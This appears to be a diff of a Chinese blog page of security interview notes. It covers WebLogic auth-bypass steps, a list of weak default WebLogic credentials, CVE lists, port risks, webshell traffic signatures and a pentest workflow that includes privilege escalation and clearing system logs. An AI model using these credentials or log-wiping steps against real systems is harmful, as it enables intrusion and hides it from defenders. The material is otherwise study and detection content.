-<h2 id="二、weblogic原理"><a href="#二、weblogic原理" class="headerlink" title="二、weblogic原理"></a>二、weblogic原理</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731173434963.png" alt="image-20230731173434963"></p>
-<p><strong>WebLogic 权限绕过的姿势？</strong></p>
-<p><code>CVE-2020-14883</code> 是一个 <code>Console</code> 的未授权访问，而 <code>CVE-2020-14883</code> 是在利用未授权访问的前提下，在 <code>Console</code> 进行代码执行，于是远程攻击者可以构造特殊的 <code>HTTP</code> 请求，在未经身份验证的情况下接管 <code>WebLogic Server Console</code> ，并在 <code>WebLogic Server Console</code> 执行任意代码。</p>
-<p>1、 通过静态资源来绕过权限验证，防止被重定向到登陆界面。</p>
-<p>2、 通过请求 <code>.portal</code> ，控制处理的 <code>Servlet</code> 是渲染 <code>UI</code> 的 <code>MBeanUtilsInitSingleFileServlet</code> 。</p>
-<p>3、 通过编码后的 <code>../</code> ，让最终渲染的模版是 <code>console.portal</code> 。</p>
-<p>综合起来，才造成了最终的未授权访问。</p>
-<p><strong>Weblogic 漏洞扫描工具</strong></p>
-<p>安装工具：</p>
-<ol>
-<li><p>安装依赖 python &gt;= 3.6 <code>pip3 install requests</code></p>
-</li>
-<li><p>下载 weblogicScanner</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a></p>
-</li>
-<li><p>进入 weblogicScanner</p>
-</li>
-<li><p>举例：测试本机是否存在漏洞 `python ws.py -t 127.0.0.1</p>
-</li>
-</ol>
-<p><strong>WebLogic 常用弱口令</strong>：</p>
-<pre class="line-numbers language-none"><code class="language-none">weblogic Oracl@123
-weblogic weblogic
-guest guest
-portaladmin portaladmin
-admin security
-joe password
-mary password
-system security
-wlcsystem wlcsystem
-wlcsystem sipisystem
-system password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><strong>weblogic漏洞</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">Weblogic 反序列化漏洞 CVE-2021-2394
-Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109
-Weblogic RCE CVE-2020-14882&amp;14883
-weblogic jndi注入CVE-2020-14841
-Weblogic coherence组件iiop反序列化漏洞 (CVE-2020-14644)
-WebLogic UniversalExtractor反序列化漏洞 CVE-2020-14645
-WebLogic CVE-2020-14756 T3IIOP反序列化RCE
-Weblogic 远程代码执行漏洞 CVE-2020-2883
-Weblogic CVE-2020-2551 IIOP协议反序列化rce
-Weblogic反序列化漏洞 CVE-2019-2890
-Weblogic反序列化远程代码执行漏洞CVE-2019-2725
-Weblogic反序列化漏洞 CVE-2019-2729
-Weblogic任意文件读取漏洞（CVE-2019-2615)）
-Weblogic 文件上传漏洞（CVE-2019-2618）
-weblogic 反序列化漏洞 CVE-2018-3252
-Weblogic反序列化远程代码执行漏洞 CVE-2018-3245
-Weblogic远程代码执行漏洞 CVE-2018-3191
-Weblogic任意文件上传漏洞（CVE-2018-2894）
-Weblogic WLS核心组件反序列化漏洞 CVE-2018-2893
-Weblogic WLS Core Components 反序列化命令执行漏洞 CVE-2018-2628
-WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）
-Weblogic 反序列化漏洞 CVE-2017-3506
-Weblogic 反序列化漏洞 CVE-2017-3248
-Weblogic SSRF漏洞 CVE-2014-4210<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <h2 id="二、常见未授权漏洞"><a href="#二、常见未授权漏洞" class="headerlink" title="二、常见未授权漏洞"></a>二、常见未授权漏洞</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731180206524.png" alt="image-20230731180206524"></p>
 <p><strong>redis</strong>   ：  端口开放到公网，默认可能没有配置用户名，利用未授权访问进去写shell，或者通过ssh的公钥进行反弹</p>
 <h3 id="二、redis"><a href="#二、redis" class="headerlink" title="二、redis"></a>二、redis</h3><p><strong>简述一下Redis 未授权访问漏洞。</strong></p>
@@ -1397,14 +1583,79 @@ save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span
 <li>JBoss 应用服务器：standalone.xml 和 standalone-full.xml 文件通常位于 /standalone/configuration/ 目录下。</li>
 </ol>
 <p>需要注意的是，这些路径可能会根据不同的操作系统而有所不同，并且也会随着中间件版本的更新而变化。因此，在进行中间件配置时，建议查询官方文档或参考相关文献以获取最新的配置文件路径信息。</p>
+<h3 id="二、weblogic原理"><a href="#二、weblogic原理" class="headerlink" title="二、weblogic原理"></a>二、weblogic原理</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731173434963.png" alt="image-20230731173434963"></p>
+<p><strong>WebLogic 权限绕过的姿势？</strong></p>
+<p><code>CVE-2020-14883</code> 是一个 <code>Console</code> 的未授权访问，而 <code>CVE-2020-14883</code> 是在利用未授权访问的前提下，在 <code>Console</code> 进行代码执行，于是远程攻击者可以构造特殊的 <code>HTTP</code> 请求，在未经身份验证的情况下接管 <code>WebLogic Server Console</code> ，并在 <code>WebLogic Server Console</code> 执行任意代码。</p>
+<p>1、 通过静态资源来绕过权限验证，防止被重定向到登陆界面。</p>
+<p>2、 通过请求 <code>.portal</code> ，控制处理的 <code>Servlet</code> 是渲染 <code>UI</code> 的 <code>MBeanUtilsInitSingleFileServlet</code> 。</p>
+<p>3、 通过编码后的 <code>../</code> ，让最终渲染的模版是 <code>console.portal</code> 。</p>
+<p>综合起来，才造成了最终的未授权访问。</p>
+<p><strong>Weblogic 漏洞扫描工具</strong></p>
+<p>安装工具：</p>
+<ol>
+<li><p>安装依赖 python &gt;= 3.6 <code>pip3 install requests</code></p>
+</li>
+<li><p>下载 weblogicScanner</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a></p>
+</li>
+<li><p>进入 weblogicScanner</p>
+</li>
+<li><p>举例：测试本机是否存在漏洞 `python ws.py -t 127.0.0.1</p>
+</li>
+</ol>
+<p><strong>WebLogic 常用弱口令</strong>：</p>
+<pre class="line-numbers language-none"><code class="language-none">weblogic Oracl@123
+weblogic weblogic
+guest guest
+portaladmin portaladmin
+admin security
+joe password
+mary password
+system security
+wlcsystem wlcsystem
+wlcsystem sipisystem
+system password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>weblogic漏洞</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">Weblogic 反序列化漏洞 CVE-2021-2394
+Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109
+Weblogic RCE CVE-2020-14882&amp;14883
+weblogic jndi注入CVE-2020-14841
+Weblogic coherence组件iiop反序列化漏洞 (CVE-2020-14644)
+WebLogic UniversalExtractor反序列化漏洞 CVE-2020-14645
+WebLogic CVE-2020-14756 T3IIOP反序列化RCE
+Weblogic 远程代码执行漏洞 CVE-2020-2883
+Weblogic CVE-2020-2551 IIOP协议反序列化rce
+Weblogic反序列化漏洞 CVE-2019-2890
+Weblogic反序列化远程代码执行漏洞CVE-2019-2725
+Weblogic反序列化漏洞 CVE-2019-2729
+Weblogic任意文件读取漏洞（CVE-2019-2615)）
+Weblogic 文件上传漏洞（CVE-2019-2618）
+weblogic 反序列化漏洞 CVE-2018-3252
+Weblogic反序列化远程代码执行漏洞 CVE-2018-3245
+Weblogic远程代码执行漏洞 CVE-2018-3191
+Weblogic任意文件上传漏洞（CVE-2018-2894）
+Weblogic WLS核心组件反序列化漏洞 CVE-2018-2893
+Weblogic WLS Core Components 反序列化命令执行漏洞 CVE-2018-2628
+WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）
+Weblogic 反序列化漏洞 CVE-2017-3506
+Weblogic 反序列化漏洞 CVE-2017-3248
+Weblogic SSRF漏洞 CVE-2014-4210<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+
 <h2 id="二、Struts2-漏洞"><a href="#二、Struts2-漏洞" class="headerlink" title="二、Struts2 漏洞"></a>二、Struts2 漏洞</h2><p>Struts2 是 apache 项目下的一个 web 框架，使用 OGNL 作为默认的表达式语言，由于 OGNL  能够创建或更改可执行代码，因此能够为使用它的任何框架引入严重的安全漏洞，多个 Apache Struts 2 版本容易受到 OGNL  安全漏洞的攻击。</p>
 <h2 id="三、thinkphp漏洞原理："><a href="#三、thinkphp漏洞原理：" class="headerlink" title="三、thinkphp漏洞原理："></a>三、thinkphp漏洞原理：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731174450857.png" alt="image-20230731174450857"></p>
 <h2 id="二、常问的端口信息："><a href="#二、常问的端口信息：" class="headerlink" title="二、常问的端口信息："></a>二、常问的端口信息：</h2><p>21：（FTP）：FTP服务常用于文件传输，常见漏洞包括弱口令、任意文件上传漏洞等。<br>22：（SSH）：SSH是远程登录系统的协议，常见漏洞包括弱口令、暴力破解、身份验证绕过等。</p>
 <p>23：（Telnet）：Telnet是一个远程控制协议，常见漏洞包括明文传输敏感信息、会话劫持等。<br>25：（SMTP）：SMTP是发送电子邮件的标准协议，常见漏洞包括垃圾邮件滥用、反射攻击等。</p>
-<p>53：（DNS）：DNS是域名解析服务，常见漏洞包括DNS缓存投毒、DDoS攻击等。<br>80/443 ：（HTTP/HTTPS）：HTTP/HTTPS是Web服务器常用的协议，常见漏洞包括SQL注入、XSS跨站脚本攻击、文件上传漏洞等。<br>443：HTTPS安全超文本传输协议</p>
+<p>53：（DNS）：DNS是域名解析服务，常见漏洞包括DNS缓存投毒、DDoS攻击等。<br>80/443 ：（HTTP/HTTPS）：HTTP/HTTPS是Web服务器常用的协议，常见漏洞包括SQL注入、XSS跨站脚本攻击、文件上传漏洞等。<br>443：HTTPS安全超文本传输协议，心脏滴血</p>
+<p>445 的永恒之蓝</p>
 <p>135（RPC）：RPC是远程过程调用协议，常见漏洞包括缓冲区溢出、拒绝服务攻击等。</p>
 <p>139/445（SMB）：SMB是Windows系统的文件共享协议，常见漏洞包括远程代码执行、密码破解等。</p>
 <p>3389（RDP）：RDP是Windows远程桌面协议，常见漏洞包括弱口令、暴力破解、远程代码执行等。</p>
+<p>6379：redis端口</p>
 <p>1433：MSSQL<br>3306：MYSQL<br>3389：windows远程桌面服务端口<br>7701：weblogic<br>8080：TCP,HTTP协议代理服务器：Apache-tomcat默认端口号</p>
 <p>以上仅是一些常见的端口及其漏洞，实际上还有很多其他的端口和漏洞。为了减少被攻击的风险，建议定期进行安全扫描，及时修复已知漏洞，并加强网络安全防护。</p>
 <p>拿到webshell不出网情况下怎么办:<br>reg上传去正向连接。探测出网协议，如dns，icmp。</p>
@@ -1415,7 +1666,7 @@ save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span
 <li><h3 id="请求中content-length"><a href="#请求中content-length" class="headerlink" title="请求中content-length"></a>请求中content-length</h3></li>
 </ol>
 <p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170930747.png" alt="image-20230731170930747"></p>
-<h2 id="二、cs的流量特征：50050端口，心跳包"><a href="#二、cs的流量特征：50050端口，心跳包" class="headerlink" title="二、cs的流量特征：50050端口，心跳包"></a>二、cs的流量特征：50050端口，心跳包</h2><h2 id="二、冰蝎4-0的流量特征（和3-0对比观看）："><a href="#二、冰蝎4-0的流量特征（和3-0对比观看）：" class="headerlink" title="二、冰蝎4.0的流量特征（和3.0对比观看）："></a>二、冰蝎4.0的流量特征（和3.0对比观看）：</h2><p>v3.0 和 v4.0 的区别很明显在于这里 <code>$_SESSION['k']=$key</code>，v3.0 版本当中会把 key 作为 session 传入；接着判断 <code>extension_loaded</code>，也就是判断服务端是否存在 <code>openssl</code>拓展，如果不存在就用 base64 解码，然后使用 key 进行异或加密，这也是冰蝎 v4.0 版本当中的 <code>xor_base64</code>加密方式；如果服务端能够加载 openssl 拓展，就使用 AES128 解密，这里对应冰蝎 v4.0 版本当中的 <code>aes</code>加密方式。</p>
+<h2 id="二、冰蝎4-0的流量特征（和3-0对比观看）："><a href="#二、冰蝎4-0的流量特征（和3-0对比观看）：" class="headerlink" title="二、冰蝎4.0的流量特征（和3.0对比观看）："></a>二、冰蝎4.0的流量特征（和3.0对比观看）：</h2><p>v3.0 和 v4.0 的区别很明显在于这里 <code>$_SESSION['k']=$key</code>，v3.0 版本当中会把 key 作为 session 传入；接着判断 <code>extension_loaded</code>，也就是判断服务端是否存在 <code>openssl</code>拓展，如果不存在就用 base64 解码，然后使用 key 进行异或加密，这也是冰蝎 v4.0 版本当中的 <code>xor_base64</code>加密方式；如果服务端能够加载 openssl 拓展，就使用 AES128 解密，这里对应冰蝎 v4.0 版本当中的 <code>aes</code>加密方式。</p>
 <p><strong>第一阶段-密钥协商</strong></p>
 <p>1.攻击者通过 GET 或者 POST 方法，形如 <a target="_blank" rel="noopener" href="http://127.0.0.1/shell.php?pass=645%E7%9A%84%E8%AF%B7%E6%B1%82%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AF%86%E9%92%A5%EF%BC%9B">http://127.0.0.1/shell.php?pass=645的请求服务器密钥；</a></p>
 <p>2.服务器使用随机数 MD5 的高16位作为密钥，存储到会话的 <code>$_SESSION</code>变量中，并返回密钥给攻击者。</p>
@@ -1427,6 +1678,15 @@ save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span
 <li>但是我自己在分析的过程中并没有看到这个密钥协商的过程，同时也没有看到 <code>$_SESSION</code>变量当中存储了 md5 的高 16 位，反而 <code>$_SESSION</code>变量存储的是一个 26 位的字符。不知道这里是我的问题还是冰蝎 4.0 版本就是如此。</li>
 </ul>
 <p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731172240969.png" alt="image-20230731172240969"></p>
+<h2 id="二、cs的流量特征：50050端口，心跳包"><a href="#二、cs的流量特征：50050端口，心跳包" class="headerlink" title="二、cs的流量特征：50050端口，心跳包"></a>二、cs的流量特征：50050端口，心跳包</h2><h2 id="二、MSF流量特征？"><a href="#二、MSF流量特征？" class="headerlink" title="二、MSF流量特征？"></a>二、MSF流量特征？</h2><p>MSF（Metasploit Framework）是一个开源的网络安全测试工具，可以用于对系统进行渗透测试和漏洞分析。在使用 MSF 进行攻击时，会产生一些特定的流量特征，包括以下几个方面：</p>
+<ol>
+<li>目标端口：MSF 框架使用多种不同的攻击模块来利用目标系统的漏洞，因此 MSF 流量通常涉及多个不同的目标端口，例如常见的 80、443、445 等端口。</li>
+<li>异常请求：MSF 框架使用恶意代码来对目标系统进行攻击，因此 MSF 流量中通常会出现大量异常请求，例如尝试访问非法 URL、发送恶意数据包等。</li>
+<li>频繁扫描：为了寻找目标系统的漏洞，MSF 框架通常会频繁地进行端口扫描、服务识别等操作，因此 MSF 流量中通常会出现大量扫描和探测请求。</li>
+<li>数据包大小：由于 MSF 框架通常会向目标系统发送大量恶意数据包，因此 MSF 流量中通常会出现较大的数据包大小。</li>
+<li>特殊协议：在攻击过程中，MSF 框架通常会使用一些特殊的协议，例如 Meterpreter、Reverse TCP 等，这些协议在 MSF 流量中通常表现出特定的流量特征。</li>
+</ol>
+<p>总之，在分析 MSF 流量时，需要综合考虑多个方面的特征，并结合具体的攻击模块和服务进行分析。同时，也需要使用适当的工具和技术，例如网络抓包工具、IDS/IPS 等，来对 MSF 流量进行捕获和分析。</p>
 <h2 id="二、菜刀流量特征："><a href="#二、菜刀流量特征：" class="headerlink" title="二、菜刀流量特征："></a>二、菜刀流量特征：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731172616407.png" alt="image-20230731172616407"></p>
 <h2 id="二、蚁剑流量特征"><a href="#二、蚁剑流量特征" class="headerlink" title="二、蚁剑流量特征:"></a>二、蚁剑流量特征:</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731173230742.png" alt="image-20230731173230742"></p>
 <h2 id="二、哥斯拉流量特征："><a href="#二、哥斯拉流量特征：" class="headerlink" title="二、哥斯拉流量特征："></a>二、哥斯拉流量特征：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731173320610.png" alt="image-20230731173320610"></p>
@@ -1440,6 +1700,14 @@ save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span
 <h2 id="三、fastjson不出网利用："><a href="#三、fastjson不出网利用：" class="headerlink" title="三、fastjson不出网利用："></a>三、fastjson不出网利用：</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731175610705.png" alt="image-20230731175610705"></h2><h2 id="三、存在-反序列化-中间件"><a href="#三、存在-反序列化-中间件" class="headerlink" title="三、存在 反序列化 中间件"></a>三、存在 反序列化 中间件</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731175803413.png" alt="image-20230731175803413"></p>
 <h2 id="三、nmap常用参数："><a href="#三、nmap常用参数：" class="headerlink" title="三、nmap常用参数："></a>三、nmap常用参数：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731180541206.png" alt="image-20230731180541206"></p>
 <h2 id="四、怎么绕过-cdn，寻找真实-ip："><a href="#四、怎么绕过-cdn，寻找真实-ip：" class="headerlink" title="四、怎么绕过 cdn，寻找真实 ip："></a>四、怎么绕过 cdn，寻找真实 ip：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731180616607.png" alt="image-20230731180616607"></p>
+<p><strong>如何判断网站是否有 CDN？</strong></p>
+<ul>
+<li>传统访问：用户访问域名 –&gt; 解析服务器 IP–&gt; 访问目标主机</li>
+<li>普通 CDN：用户访问域名 –&gt;CDN 节点 –&gt; 真实服务器 IP–&gt; 访问目标主机</li>
+<li>带 WAF 的 CDN：用户访问域名 –&gt;CDN 节点（云 WAF）–&gt; 真实服务器 IP–&gt; 访问目标主机</li>
+</ul>
+<p>很简单，使用不同地方的 ping 服务，查看对应 IP 地址是否唯一，如果不唯一则极有可能是使用了 CDN</p>
+<p>1、通过 ping 命令，查看回显情况 2、windows 系统环境下，使用 nslookup 进行查询，看返回的域名解析的情况 3、超级 ping 工具，比如”all-tool.cn/tools  /ping“「看 ip 结果」</p>
 <h2 id="四、WebShell-的利用"><a href="#四、WebShell-的利用" class="headerlink" title="四、WebShell 的利用"></a>四、WebShell 的利用</h2><p>Webshell 是黑客经常使用的一种恶意脚本，其目的是获得对服务器的执行操作权限，比如执行系统命令、窃取用户数据、删除 web  页面、修改主页等。黑客通常利用常见的漏洞，如 SQL 注入、远程文件包含 (RFI)、FTP，甚至使用跨站点脚本攻击 (XSS)  等方式作为社会工程攻击的一部分，最终达到控制网站服务器的目的。</p>
 <p>黑客可以用 web 的方式，通过 asp 或 php 木马后门控制网站服务器，包括上传下载文件、查看数据库、执行任意程序命令等。</p>
 <p>Webshell 可以嵌套在正常网页中运行，且不容易被查杀。它还可以穿越服务器防火墙，由于与被控制服务器或远程主机交互的数据都是通过 80  端口传递，因此不会被防火墙拦截，在没有记录流量的情况下，Webshell 使用 post 包发送，也不会被记录在系统日志中，只会在 Web  日志中记录一些数据提交的记录。</p>
@@ -1617,7 +1885,9 @@ save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span
 <li>通过这些命令我们可以对 Linux 下的命令执行漏洞进行利用</li>
 <li>包括系统、资源、进程、网络、用户、服务等常见的 Linux 系统命令</li>
 </ul>
-<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="三、说一下你的漏洞挖掘经历："><a href="#三、说一下你的漏洞挖掘经历：" class="headerlink" title="三、说一下你的漏洞挖掘经历："></a>三、说一下你的漏洞挖掘经历：</h2><p>挖的edu，找到个水平越权，直接改id=什么就好</p>
+<h2 id="二、判断靶标站点是-windows-x2F-linux？"><a href="#二、判断靶标站点是-windows-x2F-linux？" class="headerlink" title="二、判断靶标站点是 windows/linux？"></a>二、判断靶标站点是 windows/linux？</h2><p>1、大小写检测：windows 大小写不敏感，而 linux 大小写敏感。</p>
+<p>2、PING 指令：根据 TTL 值，winodws 一般情况下 &gt; 100,linux&lt;100 TTL (生存时间值)：该字段指定 IP 包被路由器丢弃之前允许通过的最大网段数量。</p>
+<h2 id="三、说一下你的漏洞挖掘经历："><a href="#三、说一下你的漏洞挖掘经历：" class="headerlink" title="三、说一下你的漏洞挖掘经历："></a>三、说一下你的漏洞挖掘经历：</h2><p>挖的edu，找到个水平越权，直接改id=什么就好</p>
 <h2 id="四、日志的关注点"><a href="#四、日志的关注点" class="headerlink" title="四、日志的关注点"></a>四、日志的关注点</h2><p><strong>1、异常时间段登录</strong></p>
 <p>比如半夜一两点三四点，有事件 ID4624 产生，服务器有异常登录，开启下列排查，并修改远程桌面密码，尝试溯源。</p>
 <p><strong>2、系统安全日志</strong>，针对服务器。</p>
@@ -1697,6 +1967,37 @@ normal_ret:success AND proto:rdp AND sip:(攻击IP1 OR 攻击IP2)<span aria-hidd
 </li>
 </ul>
 <h2 id="四、一个登录框可以怎么测试："><a href="#四、一个登录框可以怎么测试：" class="headerlink" title="四、一个登录框可以怎么测试："></a>四、一个登录框可以怎么测试：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731182915977.png" alt="image-20230731182915977"></p>
+<h2 id="二、拿到一个待检测的站"><a href="#二、拿到一个待检测的站" class="headerlink" title="二、拿到一个待检测的站"></a>二、拿到一个待检测的站</h2><p><strong>一、信息收集</strong></p>
+<p>1.获取域名的 whois 信息,获取注册者邮箱姓名电话等。</p>
+<p>2.通过站长之家、明小子、k8、站长之家等查询服务器旁站以及子域名站点，因为主站一般</p>
+<p>比较难，所以先看看旁站有没有通用性的 cms 或者其他漏洞。</p>
+<p>3、通过 DNS 域传送漏洞、备份号查询、SSl 证书、APP、微信公众号、暴力破解、DNS</p>
+<p>历史记录、K8 C 段查询、Jsfinder、360 或华为威胁情报、证书序列号获取企业二级域名与 ip。</p>
+<p>4、通过 Nmap、Wappalyzer、御剑等查看服务器操作系统版本，web 中间件，看看是否存</p>
+<p>在已知的漏洞，比如 IIS，APACHE,NGINX 的解析漏洞</p>
+<p>5.通过 7KB、破壳扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如</p>
+<p>php 探针（phpinfo.php）、管理员备份文件。</p>
+<p>6.google hack 进一步探测网站的信息，后台，敏感文件</p>
+<p>7、敏感信息收集，如 github 源码、用 7kb、破壳扫源代码泄露（.hg、.git、cvs、svn、.DS_store</p>
+<p>源代码泄露）、google hack、接口信息泄露、社工信息泄露、邮箱地址信息收集、网盘搜索、钟</p>
+<p>馗之眼、天眼查、威胁情报、微步在线等</p>
+<p>8、通过 Wappalyzer、御剑工具对网站指纹识别（包括，cms，cdn，证书等），dns 记录</p>
+<p><strong>二、漏洞扫描</strong></p>
+<p>1)用 AWVS、APPSCAN、长亭科技的 Xray 等扫描器检测 Web 漏洞，如 XSS,XSRF,sql</p>
+<p>注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含， 远程命</p>
+<p>令执行，弱口令，上传，编辑器漏洞，暴力破解等</p>
+<p>2)用 namp、天镜、Nessus、极光等扫描系统 ip，对扫描出来的高危漏洞进行测试，如</p>
+<p>ms08-067、ms17-010、ms12-020、ms15-035、ms19-0708、永恒之蓝 2 代、cve-2017-7494</p>
+<p>（samba）、cve-2014-6271(破壳)、php cgi 等相关漏洞验证。</p>
+<p><strong>3****）漏洞利用</strong></p>
+<p>利用以上的方式拿到 webshell，或者其他权限</p>
+<p><strong>4****）权限提升</strong></p>
+<p>提权服务器，比如 windows 下 mysql 的 udf 提权，serv-u 提权，windows 低版本的漏洞，</p>
+<p>如 iis6,pr,巴西烤肉，linux 脏牛漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以</p>
+<p>及 oracle 低权限提权</p>
+<p><strong>5)</strong> <strong>日志清理</strong></p>
+<p>操作系统、中间件、数据库等日志进行清除</p>
+<p><strong>6****）总结报告及修复方案</strong></p>
 <h2 id="四、数据库提权思路："><a href="#四、数据库提权思路：" class="headerlink" title="四、数据库提权思路："></a>四、数据库提权思路：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731183520438.png" alt="image-20230731183520438"></p>
 <p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731183550241.png" alt="image-20230731183550241"></p>
 <h2 id="四、如果有1w条告警怎么办："><a href="#四、如果有1w条告警怎么办：" class="headerlink" title="四、如果有1w条告警怎么办："></a>四、如果有1w条告警怎么办：</h2><p>样本降噪，看200，找有没有外联的东西，打进来肯定是要干点什么的，看命令执行，看ip。</p>
@@ -1784,39 +2085,22 @@ https://blog.csdn.net/zsw15841822890/article/details/115774385
 <p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802200846847.png" alt="image-20230802200846847"></p>
 <p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802200905258.png" alt="image-20230802200905258"></p>
 <p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802200919990.png" alt="image-20230802200919990"></p>
-<h2 id="二、拿到一个待检测的站"><a href="#二、拿到一个待检测的站" class="headerlink" title="二、拿到一个待检测的站"></a>二、拿到一个待检测的站</h2><p><strong>一、信息收集</strong></p>
-<p>1.获取域名的 whois 信息,获取注册者邮箱姓名电话等。</p>
-<p>2.通过站长之家、明小子、k8、站长之家等查询服务器旁站以及子域名站点，因为主站一般</p>
-<p>比较难，所以先看看旁站有没有通用性的 cms 或者其他漏洞。</p>
-<p>3、通过 DNS 域传送漏洞、备份号查询、SSl 证书、APP、微信公众号、暴力破解、DNS</p>
-<p>历史记录、K8 C 段查询、Jsfinder、360 或华为威胁情报、证书序列号获取企业二级域名与 ip。</p>
-<p>4、通过 Nmap、Wappalyzer、御剑等查看服务器操作系统版本，web 中间件，看看是否存</p>
-<p>在已知的漏洞，比如 IIS，APACHE,NGINX 的解析漏洞</p>
-<p>5.通过 7KB、破壳扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如</p>
-<p>php 探针（phpinfo.php）、管理员备份文件。</p>
-<p>6.google hack 进一步探测网站的信息，后台，敏感文件</p>
-<p>7、敏感信息收集，如 github 源码、用 7kb、破壳扫源代码泄露（.hg、.git、cvs、svn、.DS_store</p>
-<p>源代码泄露）、google hack、接口信息泄露、社工信息泄露、邮箱地址信息收集、网盘搜索、钟</p>
-<p>馗之眼、天眼查、威胁情报、微步在线等</p>
-<p>8、通过 Wappalyzer、御剑工具对网站指纹识别（包括，cms，cdn，证书等），dns 记录</p>
-<p><strong>二、漏洞扫描</strong></p>
-<p>1)用 AWVS、APPSCAN、长亭科技的 Xray 等扫描器检测 Web 漏洞，如 XSS,XSRF,sql</p>
-<p>注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含， 远程命</p>
-<p>令执行，弱口令，上传，编辑器漏洞，暴力破解等</p>
-<p>2)用 namp、天镜、Nessus、极光等扫描系统 ip，对扫描出来的高危漏洞进行测试，如</p>
-<p>ms08-067、ms17-010、ms12-020、ms15-035、ms19-0708、永恒之蓝 2 代、cve-2017-7494</p>
-<p>（samba）、cve-2014-6271(破壳)、php cgi 等相关漏洞验证。</p>
-<p><strong>3****）漏洞利用</strong></p>
-<p>利用以上的方式拿到 webshell，或者其他权限</p>
-<p><strong>4****）权限提升</strong></p>
-<p>提权服务器，比如 windows 下 mysql 的 udf 提权，serv-u 提权，windows 低版本的漏洞，</p>
-<p>如 iis6,pr,巴西烤肉，linux 脏牛漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以</p>
-<p>及 oracle 低权限提权</p>
-<p><strong>5)</strong> <strong>日志清理</strong></p>
-<p>操作系统、中间件、数据库等日志进行清除</p>
-<p><strong>6****）总结报告及修复方案</strong></p>
 <h2 id="二、敏感信息收集"><a href="#二、敏感信息收集" class="headerlink" title="二、敏感信息收集"></a>二、敏感信息收集</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802201138494.png" alt="image-20230802201138494"></p>
 <p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802201156536.png" alt="image-20230802201156536"></p>
+<h2 id="二、内网渗透"><a href="#二、内网渗透" class="headerlink" title="二、内网渗透"></a>二、内网渗透</h2><h3 id="二、内网渗透基本流程"><a href="#二、内网渗透基本流程" class="headerlink" title="二、内网渗透基本流程"></a>二、内网渗透基本流程</h3><p>漏洞挖掘 - 漏洞利用 - 提权准备 - 提权</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/0YfDibTv8hugdfVKKbYMk2DCNIR8DuuicYECVcl8S9gWVI8p6Yd22L8piaFmgxTFy7ewI1IHDoNI4yQ9qqxVY99JQ/640?wx_fmt=png&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p>
+<p>前提是利用已经控制的一台计算机作为入侵内网的跳板，在其他内网计算机看来访问全部来自于跳板机 (WEB Server)</p>
